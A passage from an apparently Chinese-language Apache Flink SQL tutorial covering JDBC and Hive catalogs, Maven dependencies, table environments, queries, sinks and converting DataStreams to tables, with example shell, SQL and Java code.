class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://repository.apache.org/content/repositories/snapshots/org/apache/flink/flink-connector-jdbc/1.17-SNAPSHOT/</span></span><br><span class="line">cp flink-connector-jdbc-1.17.jar  /opt/module/flink/lib/</span><br><span class="line">cp mysql-connector-j-8.0.31.jar /opt/module/flink/lib/</span><br><span class="line"><span class="comment"># 重启flink集群和sql-client</span></span><br><span class="line"><span class="comment"># 创建Catalog</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JdbcCatalog支持以下选项:</span></span><br><span class="line"><span class="comment"># name:必需，Catalog名称。</span></span><br><span class="line"><span class="comment"># default-database:必需，连接到的默认数据库。</span></span><br><span class="line"><span class="comment"># username: 必需，Postgres/MySQL帐户的用户名。</span></span><br><span class="line"><span class="comment"># password:必需，该帐号的密码。</span></span><br><span class="line"><span class="comment"># base-url:必需，数据库的jdbc url(不包含数据库名)</span></span><br><span class="line"><span class="comment"># 对于Postgres Catalog，是"jdbc:postgresql://&lt;ip&gt;:&lt;端口&gt;"</span></span><br><span class="line"><span class="comment"># 对于MySQL Catalog，是"jdbc: mysql://&lt;ip&gt;:&lt;端口&gt;"</span></span><br><span class="line">CREATE CATALOG my_jdbc_catalog WITH(</span><br><span class="line">    <span class="string">'type'</span> = <span class="string">'jdbc'</span>,</span><br><span class="line">    <span class="string">'default-database'</span> = <span class="string">'test'</span>,</span><br><span class="line">    <span class="string">'username'</span> = <span class="string">'root'</span>,</span><br><span class="line">    <span class="string">'password'</span> = <span class="string">'000000'</span>,</span><br><span class="line">    <span class="string">'base-url'</span> = <span class="string">'jdbc:mysql://hadoop102:3306'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看Catalog</span></span><br><span class="line">SHOW CATALOGS;</span><br><span class="line"><span class="comment">## 查看当前的CATALOG</span></span><br><span class="line">SHOW CURRENT CATALOG;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用指定Catalog</span></span><br><span class="line">USE CATALOG my_jdbc_catalog;</span><br><span class="line"><span class="comment">## 查看当前的CATALOG</span></span><br><span class="line">SHOW CURRENT CATALOG;</span><br></pre></td></tr></table></figure><h3 id="8-3-HiveCatalog">8.3 HiveCatalog</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传所需jar包到lib下</span></span><br><span class="line">cp flink-sql-connector-hive-3.1.3_2.12-1.17.0.jar /opt/module/flink/lib/</span><br><span class="line">cp mysql-connector-j-8.0.31.jar /opt/module/flink/lib/</span><br><span class="line"><span class="comment"># 更换planner依赖</span></span><br><span class="line"><span class="comment"># 只有在使用Hive方言或HiveServer2时才需要这样额外的计划器jar移动，但这是Hive集成的推荐设置</span></span><br><span class="line">mv /opt/module/flink/opt/flink-table-planner_2.12-1.17.1.jar /opt/module/flink/lib/flink-table-planner_2.12-1.17.0.jar</span><br><span class="line">mv /opt/module/flink/lib/flink-table-planner-loader-1.17.1.jar /opt/module/flink/opt/flink-table-planner-loader-1.17.0.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启flink集群和sql-client</span></span><br><span class="line"><span class="comment"># 启动外置的hive metastore服务</span></span><br><span class="line"><span class="comment"># Hive metastore必须作为独立服务运行，也就是hive-site中必须配置hive.metastore.uris</span></span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hive.metastore.uris&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;thrift://hadoop102:9083&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">hive --service metastore &amp;</span><br></pre></td></tr></table></figure><p>创建Catalog</p><table><thead><tr><th><strong>配置项</strong></th><th><strong>必需</strong></th><th><strong>默认值</strong></th><th><strong>类型</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>type</td><td>Yes</td><td>(none)</td><td>String</td><td>Catalog类型，创建HiveCatalog时必须设置为’hive’。</td></tr><tr><td>name</td><td>Yes</td><td>(none)</td><td>String</td><td>Catalog的唯一名称</td></tr><tr><td>hive-conf-dir</td><td>No</td><td>(none)</td><td>String</td><td>包含hive -site.xml的目录,需要Hadoop文件系统支持。如果没指定hdfs协议，则认为是本地文件系统。如果不指定该选项，则在类路径中搜索hive-site.xml。</td></tr><tr><td>default-database</td><td>No</td><td>default</td><td>String</td><td>Hive Catalog使用的默认数据库</td></tr><tr><td>hive-version</td><td>No</td><td>(none)</td><td>String</td><td>HiveCatalog能够自动检测正在使用的Hive版本。建议不要指定Hive版本，除非自动检测失败。</td></tr><tr><td>hadoop-conf-dir</td><td>No</td><td>(none)</td><td>String</td><td>Hadoop conf目录的路径。只支持本地文件系统路径。设置Hadoop conf的推荐方法是通过HADOOP_CONF_DIR环境变量。只有当环境变量不适合你时才使用该选项，例如，如果你想分别配置每个HiveCatalog。</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">CATALOG</span> myhive <span class="keyword">WITH</span> (</span><br><span class="line">    <span class="string">'type'</span> = <span class="string">'hive'</span>,</span><br><span class="line">    <span class="string">'default-database'</span> = <span class="string">'default'</span>,</span><br><span class="line">    <span class="string">'hive-conf-dir'</span> = <span class="string">'/opt/module/hive/conf'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看Catalog</span></span><br><span class="line"><span class="keyword">SHOW</span> CATALOGS;</span><br><span class="line"><span class="comment">--查看当前的CATALOG</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CURRENT</span> <span class="keyword">CATALOG</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用指定Catalog</span></span><br><span class="line"><span class="keyword">USE</span> <span class="keyword">CATALOG</span> myhive;</span><br><span class="line"><span class="comment">--查看当前的CATALOG</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CURRENT</span> <span class="keyword">CATALOG</span>;</span><br><span class="line"><span class="comment"># 建表，退出sql-client重进，查看catalog和表还在</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 读写Hive表</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">DATABASES</span>; <span class="comment">-- 可以看到hive的数据库</span></span><br><span class="line"><span class="keyword">USE</span> <span class="keyword">test</span>;  <span class="comment">-- 可以切换到hive的数据库</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLES</span>; <span class="comment">-- 可以看到hive的表</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> ws; <span class="comment">--可以读取hive表</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> ws <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>); <span class="comment">-- 可以写入hive表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 断开后可以持久化保存</span></span><br></pre></td></tr></table></figure><h2 id="9、代码中使用FlinkSQL">9、代码中使用FlinkSQL</h2><h3 id="9-1-环境准备">9.1 环境准备</h3><p>引入相关依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-table-api-java-bridge<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的依赖是一个Java的“桥接器”（bridge），主要就是负责Table API和下层DataStream API的连接支持，按照不同的语言分为Java版和Scala版。如果我们希望在本地的集成开发环境（IDE）里运行Table API和SQL，还需要引入以下依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-table-planner-loader<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-table-runtime<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-files<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-2-创建表环境">9.2 创建表环境</h3><p>对于Flink这样的流处理框架来说，数据流和表在结构上还是有所区别的。所以使用Table API和SQL需要一个特别的运行时环境，这就是所谓的“表环境”（TableEnvironment）。它主要负责：</p><ul><li>注册Catalog和表；</li><li>执行 SQL 查询；</li><li>注册用户自定义函数（UDF）；</li><li>DataStream 和表之间的转换。</li></ul><p>每个表和SQL的执行，都必须绑定在一个表环境（TableEnvironment）中。TableEnvironment是Table API中提供的基本接口类，可以通过调用静态的create()方法来创建一个表环境实例。方法需要传入一个环境的配置参数EnvironmentSettings，它可以指定当前表环境的执行模式和计划器（planner）。执行模式有批处理和流处理两种选择，默认是流处理模式；计划器默认使用blink planner。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">EnvironmentSettings settings = EnvironmentSettings</span><br><span class="line">    .newInstance()</span><br><span class="line">    .inStreamingMode()    <span class="comment">// 使用流处理模式</span></span><br><span class="line">    .build();</span><br><span class="line"></span><br><span class="line">TableEnvironment tableEnv = TableEnvironment.create(setting);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于流处理场景，其实默认配置就完全够用了。所以我们也可以用另一种更加简单的方式来创建表环境</span></span><br><span class="line"></span><br><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里我们引入了一个“流式表环境”（StreamTableEnvironment），它是继承自TableEnvironment的子接口。</span></span><br><span class="line"><span class="comment">// 调用它的create()方法，只需要直接将当前的流执行环境（StreamExecutionEnvironment）传入，就可以创建出对应的流式表环境了</span></span><br></pre></td></tr></table></figure><h3 id="9-3-创建表">9.3 创建表</h3><p><strong>连接器表（Connector Tables）</strong></p><p>最直观的创建表的方式，就是通过连接器（connector）连接到一个外部系统，然后定义出对应的表结构。在代码中，我们可以调用表环境的executeSql()方法，可以传入一个DDL作为参数执行SQL操作。这里我们传入一个CREATE语句进行表的创建，并通过WITH关键字指定连接到外部系统的连接器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableEnv.executeSql(<span class="string">"CREATE [TEMPORARY] TABLE MyTable ... WITH ( 'connector' = ... )"</span>);</span><br></pre></td></tr></table></figure><p><strong>虚拟表（Virtual Tables）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Table newTable = tableEnv.sqlQuery(<span class="string">"SELECT ... FROM MyTable... "</span>);</span><br><span class="line"><span class="comment">// 这里调用了表环境的sqlQuery()方法，直接传入一条SQL语句作为参数执行查询，得到的结果是一个Table对象。</span></span><br><span class="line"><span class="comment">// Table是Table API中提供的核心接口类，就代表了一个Java中定义的表实例。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于newTable是一个Table对象，并没有在表环境中注册；所以如果希望直接在SQL中使用，我们还需要将这个中间结果表注册到环境中</span></span><br><span class="line">tableEnv.createTemporaryView(<span class="string">"NewTable"</span>, newTable);</span><br><span class="line"><span class="comment">// 类似于视图</span></span><br></pre></td></tr></table></figure><h3 id="9-4-表的查询">9.4 表的查询</h3><p><strong>执行SQL进行查询</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建表环境</span></span><br><span class="line">TableEnvironment tableEnv = ...; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建表</span></span><br><span class="line">tableEnv.executeSql(<span class="string">"CREATE TABLE EventTable ... WITH ( 'connector' = ... )"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询用户Alice的点击事件，并提取表中前两个字段</span></span><br><span class="line">Table aliceVisitTable = tableEnv.sqlQuery(</span><br><span class="line">    <span class="string">"SELECT user, url "</span> +</span><br><span class="line">    <span class="string">"FROM EventTable "</span> +</span><br><span class="line">    <span class="string">"WHERE user = 'Alice' "</span></span><br><span class="line">  );</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 分组</span></span><br><span class="line">Table urlCountTable = tableEnv.sqlQuery(</span><br><span class="line">  <span class="string">"SELECT user, COUNT(url) "</span> +</span><br><span class="line">  <span class="string">"FROM EventTable "</span> +</span><br><span class="line">  <span class="string">"GROUP BY user "</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接将查询的结果写入到已经注册的表</span></span><br><span class="line"><span class="comment">// 注册表</span></span><br><span class="line">tableEnv.executeSql(<span class="string">"CREATE TABLE EventTable ... WITH ( 'connector' = ... )"</span>);</span><br><span class="line">tableEnv.executeSql(<span class="string">"CREATE TABLE OutputTable ... WITH ( 'connector' = ... )"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将查询结果输出到OutputTable中</span></span><br><span class="line">tableEnv.executeSql (</span><br><span class="line"><span class="string">"INSERT INTO OutputTable "</span> +</span><br><span class="line">    <span class="string">"SELECT user, url "</span> +</span><br><span class="line">    <span class="string">"FROM EventTable "</span> +</span><br><span class="line">    <span class="string">"WHERE user = 'Alice' "</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><p><strong>调用Table API进行查询</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基于环境中已注册的表，可以通过表环境的from()方法非常容易地得到一个Table对象</span></span><br><span class="line">Table eventTable = tableEnv.from(<span class="string">"EventTable"</span>);</span><br><span class="line"><span class="comment">// 传入的参数就是注册好的表名。注意这里eventTable是一个Table对象，而EventTable是在环境中注册的表名。</span></span><br><span class="line"><span class="comment">// 得到Table对象之后，就可以调用API进行各种转换操作了，得到的是一个新的Table对象</span></span><br><span class="line"></span><br><span class="line">Table maryClickTable = eventTable</span><br><span class="line">        .where($(<span class="string">"user"</span>).isEqual(<span class="string">"Alice"</span>))</span><br><span class="line">        .select($(<span class="string">"url"</span>), $(<span class="string">"user"</span>));</span><br><span class="line"><span class="comment">// 这里每个方法的参数都是一个“表达式”（Expression），用方法调用的形式直观地说明了想要表达的内容；“$”符号用来指定表中的一个字段。上面的代码和直接执行SQL是等效的</span></span><br></pre></td></tr></table></figure><p><strong>两种API的结合使用</strong></p><p>无论是调用Table API还是执行SQL，得到的结果都是一个Table对象；所以这两种API的查询可以很方便地结合在一起</p><ul><li>无论是那种方式得到的Table对象，都可以继续调用Table API进行查询转换；</li><li>如果想要对一个表执行SQL操作（用FROM关键字引用），必须先在环境中对它进行注册。所以我们可以通过创建虚拟表的方式实现两者的转换</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableEnv.createTemporaryView(<span class="string">"MyTable"</span>, myTable);</span><br></pre></td></tr></table></figure><h3 id="9-5-输出表">9.5 输出表</h3><p>表的创建和查询，就对应着流处理中的读取数据源（Source）和转换（Transform）；而最后一个步骤Sink，也就是将结果数据输出到外部系统，就对应着表的输出操作。在代码上，输出一张表最直接的方法，就是调用Table的方法executeInsert()方法将一个 Table写入到注册过的表中，方法传入的参数就是注册的表名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册表，用于输出数据到外部系统</span></span><br><span class="line">tableEnv.executeSql(<span class="string">"CREATE TABLE OutputTable ... WITH ( 'connector' = ... )"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 经过查询转换，得到结果表</span></span><br><span class="line">Table result = ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果表写入已注册的输出表中</span></span><br><span class="line">result.executeInsert(<span class="string">"OutputTable"</span>);</span><br></pre></td></tr></table></figure><p>在底层，表的输出是通过将数据写入到TableSink来实现的。TableSink是Table API中提供的一个向外部系统写入数据的通用接口，可以支持不同的文件格式（比如CSV、Parquet）、存储数据库（比如JDBC、Elasticsearch）和消息队列（比如Kafka）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SqlDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 1.创建表环境</span></span><br><span class="line">        <span class="comment">// 1.1 写法一：</span></span><br><span class="line"><span class="comment">//        EnvironmentSettings settings = EnvironmentSettings.newInstance()</span></span><br><span class="line"><span class="comment">//                .inStreamingMode()</span></span><br><span class="line"><span class="comment">//                .build();</span></span><br><span class="line"><span class="comment">//        StreamTableEnvironment tableEnv = TableEnvironment.create(settings);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.2 写法二</span></span><br><span class="line">        StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 2.创建表</span></span><br><span class="line">        tableEnv.executeSql(<span class="string">"CREATE TABLE source ( \n"</span> +</span><br><span class="line">                <span class="string">"    id INT, \n"</span> +</span><br><span class="line">                <span class="string">"    ts BIGINT, \n"</span> +</span><br><span class="line">                <span class="string">"    vc INT\n"</span> +</span><br><span class="line">                <span class="string">") WITH ( \n"</span> +</span><br><span class="line">                <span class="string">"    'connector' = 'datagen', \n"</span> +</span><br><span class="line">                <span class="string">"    'rows-per-second'='1', \n"</span> +</span><br><span class="line">                <span class="string">"    'fields.id.kind'='random', \n"</span> +</span><br><span class="line">                <span class="string">"    'fields.id.min'='1', \n"</span> +</span><br><span class="line">                <span class="string">"    'fields.id.max'='10', \n"</span> +</span><br><span class="line">                <span class="string">"    'fields.ts.kind'='sequence', \n"</span> +</span><br><span class="line">                <span class="string">"    'fields.ts.start'='1', \n"</span> +</span><br><span class="line">                <span class="string">"    'fields.ts.end'='1000000', \n"</span> +</span><br><span class="line">                <span class="string">"    'fields.vc.kind'='random', \n"</span> +</span><br><span class="line">                <span class="string">"    'fields.vc.min'='1', \n"</span> +</span><br><span class="line">                <span class="string">"    'fields.vc.max'='100'\n"</span> +</span><br><span class="line">                <span class="string">");\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        tableEnv.executeSql(<span class="string">"CREATE TABLE sink (\n"</span> +</span><br><span class="line">                <span class="string">"    id INT, \n"</span> +</span><br><span class="line">                <span class="string">"    sumVC INT \n"</span> +</span><br><span class="line">                <span class="string">") WITH (\n"</span> +</span><br><span class="line">                <span class="string">"'connector' = 'print'\n"</span> +</span><br><span class="line">                <span class="string">");\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 3.执行查询</span></span><br><span class="line">        <span class="comment">// 3.1 使用sql进行查询</span></span><br><span class="line"><span class="comment">//        Table table = tableEnv.sqlQuery("select id,sum(vc) as sumVC from source where id&gt;5 group by id ;");</span></span><br><span class="line">        <span class="comment">// 把table对象，注册成表名</span></span><br><span class="line"><span class="comment">//        tableEnv.createTemporaryView("tmp", table);</span></span><br><span class="line"><span class="comment">//        tableEnv.sqlQuery("select * from tmp where id &gt; 7");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.2 用table api来查询</span></span><br><span class="line">        Table source = tableEnv.from(<span class="string">"source"</span>);</span><br><span class="line">        Table result = source</span><br><span class="line">                .where($(<span class="string">"id"</span>).isGreater(<span class="number">5</span>))</span><br><span class="line">                .groupBy($(<span class="string">"id"</span>))</span><br><span class="line">                .aggregate($(<span class="string">"vc"</span>).sum().as(<span class="string">"sumVC"</span>))</span><br><span class="line">                .select($(<span class="string">"id"</span>), $(<span class="string">"sumVC"</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 4.输出表</span></span><br><span class="line">        <span class="comment">// 4.1 sql用法</span></span><br><span class="line"><span class="comment">//        tableEnv.executeSql("insert into sink select * from tmp");</span></span><br><span class="line">        <span class="comment">// 4.2 tableapi用法</span></span><br><span class="line">        result.executeInsert(<span class="string">"sink"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-6-表和流的转换">9.6 表和流的转换</h3><h4 id="将流（DataStream）转换成表（Table）">将流（DataStream）转换成表（Table）</h4><p><strong>调用fromDataStream()方法</strong>，想要将一个DataStream转换成表很简单，可以通过调用表环境的fromDataStream()方法来实现，返回的就是一个Table对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"><span class="comment">// 获取表环境</span></span><br><span class="line">StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"><span class="comment">// 读取数据源</span></span><br><span class="line">SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env.fromSource(...)</span><br><span class="line"><span class="comment">// 将数据流转换成表</span></span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(sensorDS);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于流中的数据本身就是定义好的POJO类型WaterSensor，所以我们将流转换成表之后，每一行数据就对应着一个WaterSensor，而表中的列名就对应着WaterSensor中的属性。</span></span><br><span class="line"><span class="comment">// 另外，我们还可以在fromDataStream()方法中增加参数，用来指定提取哪些属性作为表中的字段名，并可以任意指定位置</span></span><br><span class="line"><span class="comment">// 提取Event中的timestamp和url作为表中的列</span></span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(sensorDS, $(<span class="string">"id"</span>), $(<span class="string">"vc"</span>));</span><br><span class="line"><span class="comment">// 也可以通过表达式的as()方法对字段进行重命名</span></span><br><span class="line"><span class="comment">// 将timestamp字段重命名为ts</span></span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(sensorDS, $(<span class="string">"id"</span>).as(<span class="string">"sid"</span>), $(<span class="string">"vc"</span>));</span><br></pre></td></tr></table></figure><p><strong>调用createTemporaryView()方法</strong>，调用fromDataStream()方法简单直观，可以直接实现DataStream到Table的转换；不过如果我们希望直接在SQL中引用这张表，就还需要调用表环境的createTemporaryView()方法来创建虚拟视图了。</p><p>对于这种场景，也有一种更简洁的调用方式。我们可以直接调用createTemporaryView()方法创建虚拟表，传入的两个参数，第一个依然是注册的表名，而第二个可以直接就是DataStream。之后仍旧可以传入多个参数，用来指定表中的字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 